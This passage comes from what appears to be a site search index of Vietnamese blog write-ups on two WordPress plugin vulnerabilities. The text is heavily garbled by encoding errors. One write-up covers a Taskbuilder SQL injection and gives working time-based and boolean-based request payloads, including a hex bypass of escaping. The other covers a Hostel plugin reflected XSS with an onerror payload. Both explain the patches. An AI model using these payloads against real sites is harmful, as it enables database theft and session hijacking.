v4.0.1\u0026rdquo; }\n·ªû b·∫£n v4.0.2, truy v·∫•n ƒë√£ ƒë∆∞·ª£c ƒëi·ªÅu ch·ªânh b·∫±ng c√°ch ƒë·∫∑t $proj_id trong d·∫•u nh√°y ƒë∆°n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.2\u0026rdquo; }\nB·∫£n v√° n√†y ƒë·∫£m b·∫£o r·∫±ng gi√° tr·ªã $proj_id sau khi escape ƒë∆∞·ª£c coi l√† m·ªôt chu·ªói literal, kh√¥ng th·ªÉ tho√°t ra kh·ªèi d·∫•u nh√°y ƒë∆°n ƒë·ªÉ ch√®n th√™m c√∫ ph√°p SQL, qua ƒë√≥ ngƒÉn ch·∫∑n t·∫•n c√¥ng SQL Injection.\nHow it work? File architecture:\nC·∫•u tr√∫c chung c·ªßa file hi·ªán t·∫°i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o n·ªôi dung ch√≠nh (body) c·ªßa modal ob_start(); // ... render HTML danh s√°ch users $body = ob_get_clean(); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o ph·∫ßn footer c·ªßa modal ob_start(); // ... render HTML c√°c n√∫t thao t√°c (Close, Save) $footer = ob_get_clean(); // Tr·∫£ d·ªØ li·ªáu JSON ƒë·ªÉ frontend hi·ªÉn th·ªã modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n$proj_id / $project: L·∫•y d·ªØ li·ªáu project t·ª´ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay v√¨ xu·∫•t tr·ª±c ti·∫øp, gi√∫p gom n·ªôi dung v√†o bi·∫øn. $body / $footer: Ch·ª©a n·ªôi dung HTML ƒë·ªông c·ªßa modal. json_encode(): Tr·∫£ JSON cho client, c√≥ kh·∫£ nƒÉng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong Ajax ƒë·ªÉ hi·ªÉn th·ªã modal m√† kh√¥ng c·∫ßn refresh trang. File n·∫±m trong th∆∞ m·ª•c includes cho th·∫•y r·∫±ng n√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi ·ªü 1 ch·ª©c nƒÉng n√†o ƒë√≥ ·ªü n∆°i kh√°c. ƒê·ªÉ bi·∫øt ch·ª©c nƒÉng n√†o s·ª≠ d·ª•ng n√≥, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_users.php trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ N√≥ ƒë∆∞·ª£c include trong h√†m wppm_get_users() c·ªßa class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() l√† callback c·ªßa action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } {: file=\u0026ldquo;includes/class-wppm-admin.php v4.0.1\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. wp_ajax_wppm_get_users l√† t√™n hook Ajax, v·ªõi quy t·∫Øc ƒë·∫∑t t√™n: wp_ajax_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ƒë√£ ƒëƒÉng nh·∫≠p. wp_ajax_nopriv_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ch∆∞a ƒëƒÉng nh·∫≠p. ·ªû ƒë√¢y, action = wppm_get_users. Nghƒ©a l√† n·∫øu trong Ajax request b·∫°n g·ª≠i action=wppm_get_users t·ªõi admin-ajax.php, th√¨ WordPress s·∫Ω t√¨m callback t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω, ·ªü ƒë√¢y l√† wppm_get_users(). üëâ Ta ƒë√£ bi·∫øt ƒë∆∞·ª£c action = wppm_get_users, ki·ªÉm tra xem Ajax n√†o s·ª≠ d·ª•ng action n√†y b·∫±ng c√°ch t√¨m t·ª´ kh√≥a wppm_get_users tr√™n c√°c file .js trong th∆∞ m·ª•c ch·ª©a plugin.\nAction wppm_get_users l√† ph·∫ßn data trong request POST c·ªßa h√†m wppm_get_users()\nH√†m wppm_get_users() s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t trong HTML attribute c·ªßa ch·ª©c nƒÉng project\nT·∫°o project m·ªõi Truy c·∫≠p v√†o project ƒë√≥ Inspect code v√† t√¨m h√†m wppm_get_users s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t ·ªü ƒë√¢u, h√†nh ƒë·ªông n√†o s·∫Ω g·ªçi n√≥ üëâ Khi click v√†o icon b√™n c·∫°nh Users ajax s·∫Ω ho·∫°t ƒë·ªông, g·ª≠i request ƒë·∫øn server, l·∫•y danh s√°ch c√°c user tham gia project v√† m√£ HTML hi·ªÉn th·ªã n√≥.\nExploit Detect SQLi B·∫Øt request b·∫±ng BurpSuite, g·ª≠i request v·ªõi SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id ƒë√∫ng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w t∆∞∆°ng ·ª©ng v·ªõi m√£ HEX l√† 0x77 {: .prompt-info }\nS·ª≠ d·ª•ng SUBSTRING(STRING,1,1) ƒë·ªÉ l·∫•y k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa chu·ªói\n·ªû ƒë√¢y, $proj_id b·∫±ng 4 v√¨ SUBSTRING('wordpress',1,1)=0x77 l√† ƒë√∫ng n√™n SELECT l·∫•y gi√° tr·ªã ƒë√∫ng trong IF(condition, value if true, value if false), 4 l√† gi√° tr·ªã c√≥ th·ª±c trong database, n√™n response tr·∫£ v·ªÅ ch·ª©a danh s√°ch ng∆∞·ªùi tham gia d·ª± √°n\nS·ª≠ d·ª•ng HEX technique ƒë·ªÉ bypass h√†m esc_sql() ·ªü tr√™n, d√πng ƒë·ªÉ so s√°nh khi kh√¥ng s·ª≠ d√πng ƒë∆∞·ª£c '\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) V·ªõi proj_id kh√¥ng c√≥ th·ª±c trong database, response s·∫Ω tr·∫£ v·ªÅ k·∫øt qu·∫£ ch·ª©a None\nüëâ Ta ƒë√£ l·∫•y ƒë∆∞·ª£c k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa database name b·∫±ng k·ªπ thu·∫≠t boolean base\nproj_id ƒë√πng: response kh√¥ng ch·ª©a None proj_id sai: response ch·ª©a None C√≥ th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t time base nh∆∞ng khi dump s·ªë l∆∞·ª£ng l·ªõn data, th·ªùi gian dump s·∫Ω r·∫•t l√¢u {: .prompt-info }\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-39569 trong plugin WordPress Taskbuilder xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu d·∫•u nh√°y ƒë∆°n '...' bao quanh d·ªØ li·ªáu ƒë·∫ßu v√†o trong c√¢u l·ªánh SQL, khi·∫øn d·ªØ li·ªáu ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c di·ªÖn gi·∫£i nh∆∞ m·ªôt ph·∫ßn c·ªßa c√¢u l·ªánh SQL h·ª£p l·ªá.\nB·∫£n v√° ·ªü phi√™n b·∫£n 4.0.2 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch ƒë∆∞a $proj_id v√†o trong '...', ƒë·∫£m b·∫£o n√≥ lu√¥n ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ m·ªôt literal string trong SQL.\nKey takeaways:\n∆Øu ti√™n s·ª≠ d·ª•ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay v√¨ t·ª± ch√®n d·ªØ li·ªáu v√†o query. ƒê·ªëi v·ªõi c√°c plugin WordPress, c·∫ßn test k·ªπ l∆∞·ª°ng c√°c Ajax endpoint v√¨ ƒë√¢y l√† n∆°i d·ªÖ xu·∫•t hi·ªán SQLi v√† XSS nh·∫•t. Ng∆∞·ªùi qu·∫£n tr·ªã c·∫ßn th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin/theme ƒë·ªÉ nh·∫≠n b·∫£n v√° k·ªãp th·ªùi. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-08-31-cve-2025-39569/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) v√† v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ \u003cstrong\u003ex·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o\u003c/strong\u003e tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n \u003ccode\u003e'...'\u003c/code\u003e. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Hostel c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.1.5.8. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ admin.\nCVE ID: CVE-2025-6234 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 1.1.5.8 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.7(vul) v√† v1.1.5.8(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán sanitize (l√†m s·∫°ch d·ªØ li·ªáu) v√† escape (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng Reflected Cross-Site Scripting (XSS)\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file views/bookings.html.php v√† controllers/bookings.php\nFile views/bookings.html.php\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.7\u0026rdquo; }\nTham s·ªë ob ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ $_GET['ob'] v√† echo ra HTML attribute m√† kh√¥ng c√≥ b·∫•t k√¨ x·ª≠ l√Ω escape n√†o. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn nguy c∆° Reflected XSS (Cross-Site Scripting), v√¨ attacker c√≥ th·ªÉ ch√®n payload v√†o query string,\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.8\u0026rdquo; }\nB·∫£n v√° ƒë√£ s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ encode $_GET['ob'] th√†nh d·∫°ng an to√†n tr∆∞·ªõc khi echo ra HTML attribute.\nSource: $_GET['ob'] l√† d·ªØ li·ªáu nh·∫≠p t·ª´ client (URL query string), attacker c√≥ th·ªÉ ki·ªÉm so√°t ho√†n to√†n. Sink: echo trong HTML attribute ob=\u0026lt;?php echo @$_GET['ob']?\u0026gt; üëâ V√¨ source kh√¥ng ƒëi qua logic c·ªßa controllers n√™n ta kh√¥ng c·∫ßn quan t√¢m diff c·ªßa controllers/bookings.php\nHow it work? ƒê·ªÉ $_GET['ob'] ƒë∆∞·ª£c echo ra HTML attribute c·ªßa th·∫ª \u0026lt;a\u0026gt; th√¨ ƒëi·ªÅu ki·ªán trong kh·ªëi if ch·ª©a th·∫ª \u0026lt;a\u0026gt; ph·∫£i true\n\u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt;\t{: file=\u0026ldquo;views/bookings.html.php\u0026rdquo; }\nüëâ ƒêi·ªÅu ki·ªán quan tr·ªçng c·∫ßn ch√∫ √Ω l√† if($offset \u0026gt; 0), v√¨ ch·ªâ c·∫ßn ƒëi·ªÅu ki·ªán n√†y ƒë√∫ng th√¨ XSS ƒë√£ c√≥ th·ªÉ x·∫£y ra. Kh√¥ng c·∫ßn quan t√¢m if($count \u0026gt; ($page_limit + $offset)).\nFile views/bookings.html.php kh√¥ng th·ªÉ truy c·∫≠p tr·ª±c ti·∫øp, m√† ph·∫£i ƒë∆∞·ª£c controllers g·ªçi th√¥ng qua h√†m include()\nBi·∫øn $offset ƒë∆∞·ª£c controller kh·ªüi t·∫°o tr∆∞·ªõc r·ªìi truy·ªÅn sang view (views/bookings.html.php) ƒë·ªÉ d√πng trong m·ªánh ƒë·ªÅ if.\nƒê·ªÉ x√°c ƒë·ªãnh controller n√†o g·ªçi file view n√†y, ta t√¨m ki·∫øm bi·∫øn $offset trong th∆∞ m·ª•c controllers c·ªßa plugin.\nK·∫øt qu·∫£ cho th·∫•y $offset ƒë∆∞·ª£c t·∫°o trong nh√°nh default (listing bookings) c·ªßa h√†m tƒ©nh manage() trong class WPHostelBookings, n·∫±m ·ªü file controllers/bookings.php.\nController Code\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { // other logic // list bookings default: // which bookings to show - upcoming or past? $type = empty($_GET[\u0026#39;type\u0026#39;]) ? \u0026#39;upcoming\u0026#39; : sanitize_text_field($_GET[\u0026#39;type\u0026#39;]); $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); $dir = empty($_GET[\u0026#39;dir\u0026#39;]) ? \u0026#39;ASC\u0026#39; : $_GET[\u0026#39;dir\u0026#39;]; if($dir != \u0026#39;ASC\u0026#39; and $dir != \u0026#39;DESC\u0026#39;) $dir = \u0026#39;ASC\u0026#39;; $odir = ($dir == \u0026#39;ASC\u0026#39;) ? \u0026#39;DESC\u0026#39; : \u0026#39;ASC\u0026#39;; // other logic // define limit (as it\u0026#39;s paginated)\t$page_limit = 20; $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; // other logic\t$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); $count = $wpdb-\u0026gt;get_var(\u0026#34;SELECT FOUND_ROWS()\u0026#34;);\t// other logic if(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tbreak; } } } {: file=\u0026ldquo;controllers/bookings.php v1.1.5.7\u0026rdquo; }\nPh√¢n t√≠ch bi·∫øn $offset\nBi·∫øn $offset ƒë∆∞·ª£c kh·ªüi t·∫°o t·ª´ tham s·ªë offset trong URL ($_GET['offset']):\nN·∫øu kh√¥ng c√≥ tham s·ªë =\u0026gt; m·∫∑c ƒë·ªãnh 0. N·∫øu c√≥ =\u0026gt; √©p ki·ªÉu s·ªë nguy√™n b·∫±ng intval(). $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); Ph√¢n t√≠ch bi·∫øn $page_limit\n$page_limit ƒë∆∞·ª£c ƒë·∫∑t c·ªë ƒë·ªãnh l√† 20, d√πng k·∫øt h·ª£p v·ªõi $offset ƒë·ªÉ ph√¢n trang:\n// define limit (as it\u0026#39;s paginated)\t$page_limit = 20; // LIMIT offset, 20 $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; Khi ƒë√≥ SQL tr·∫£ v·ªÅ t·ªëi ƒëa 20 b·∫£n ghi, b·∫Øt ƒë·∫ßu t·ª´ v·ªã tr√≠ $offset.\n√Åp d·ª•ng v√†o m·ªánh ƒë·ªÅ if:\nTrong view, ƒëo·∫°n code XSS payload ch·ªâ hi·ªÉn th·ªã khi:\nif($offset \u0026gt; 0) =\u0026gt; t·ª©c l√† ph·∫£i c√≥ offset t·ª´ 1 tr·ªü l√™n. Mu·ªën offset \u0026gt; 0 c√≥ √Ω nghƒ©a, c∆° s·ªü d·ªØ li·ªáu ph·∫£i c√≥ √≠t nh·∫•t 2 booking. N·∫øu ch·ªâ c√≥ 1 booking th√¨ sau khi b·ªè qua 1 d√≤ng (offset=1), kh√¥ng c√≤n d·ªØ li·ªáu n√†o ƒë·ªÉ hi·ªÉn th·ªã, n√™n payload c≈©ng kh√¥ng render ra. üëâ Do ƒë√≥, ƒë·ªÉ khai th√°c th√†nh c√¥ng, c·∫ßn c√≥ t·ªëi thi·ªÉu 2 booking trong database.\nCu·ªëi c√πng c√°c k·∫øt qu·∫£ ƒë∆∞·ª£c ch·ª©a trong c√°c bi·∫øn s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã ra views th√¥ng qua h√†m include()\nif(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tWPHOSTEL_PATH c√≥ th·ªÉ l√† h·∫±ng global ƒë∆∞·ª£c s·ª≠ d·ª•ng sau khi file PHP ch·ª©a n√≥ ƒë∆∞·ª£c load, ƒê·ªÉ bi·∫øt ƒë∆∞·ª£c ch√≠nh x√°c, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a WPHOSTEL_PATH.\nüëâ WPHOSTEL_PATH b√¢y gi·ªù l√† ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi t·ªõi th∆∞ m·ª•c ch·ª©a file hi·ªán t·∫°i.\nExploit Request v·ªõi XSS payload\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;offset=1\u0026amp;ob=\u0026#34;\u0026gt;\u0026lt;img+src%3D1+onerror%3Dalert%28document.domain%29\u0026gt; HTTP/1.1 Payload th·ª±c t·∫ø:\n\u0026#34;\u0026gt;\u0026lt;img src=x onerror=alert(document.domain)\u0026gt; ƒê√≥ng th·∫ª \u0026lt;a\u0026gt; b·∫±ng k√Ω t·ª± \u0026quot;\u0026gt;. Ch√®n th√™m th·∫ª \u0026lt;img\u0026gt; c√≥ thu·ªôc t√≠nh onerror ƒë·ªÉ k√≠ch ho·∫°t JavaScript. D√πng alert(document.domain) thay cho alert(1) nh∆∞ m·ªôt th√≥i quen, nh·∫±m ch·ª©ng minh r√µ r√†ng kh·∫£ nƒÉng ƒë·ªçc th√¥ng tin t·ª´ DOM. ƒêi·ªÅu n√†y c≈©ng gi√∫p tr√°nh tr∆∞·ªùng h·ª£p Sandbox Domain khi·∫øn cho t√°c ƒë·ªông c·ªßa payload b·ªã xem nh·∫π ho·∫∑c kh√¥ng c√≥. K·∫øt qu·∫£:\nConclusion L·ªó h·ªïng CVE-2025-6234 trong plugin WordPress Hostel b·∫Øt ngu·ªìn t·ª´ vi·ªác kh√¥ng x·ª≠ l√Ω ƒë√∫ng d·ªØ li·ªáu ƒë·∫ßu v√†o ($_GET['ob']) tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n giao di·ªán. ƒêi·ªÅu n√†y m·ªü ra kh·∫£ nƒÉng cho attacker ch√®n m√£ ƒë·ªôc Reflected XSS.\nB·∫£n v√° ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ escape d·ªØ li·ªáu tr∆∞·ªõc khi in ra HTML, ƒë·∫£m b·∫£o r·∫±ng c√°c gi√° tr·ªã kh√¥ng tin c·∫≠y kh√¥ng th·ªÉ ch√®n script ƒë·ªôc h·∫°i.\nKey takeaways:\nLu√¥n sanitize d·ªØ li·ªáu ƒë·∫ßu v√†o v√† escape d·ªØ li·ªáu ƒë·∫ßu ra theo ng·ªØ c·∫£nh (context). V·ªõi WordPress, t·∫≠n d·ª•ng c√°c h√†m built-in nh∆∞ sanitize_text_field(), esc_attr(), esc_html(), wp_kses()\u0026hellip; ƒë·ªÉ gi·∫£m thi·ªÉu r·ªßi ro b·∫£o m·∫≠t. References XSSCross-site scripting (XSS) cheat sheet - PortSwigger\nWordPress Hostel Plugin \u0026lt; 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-28-cve-2025-6234/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eHostel\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.8\u003c/strong\u003e. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ 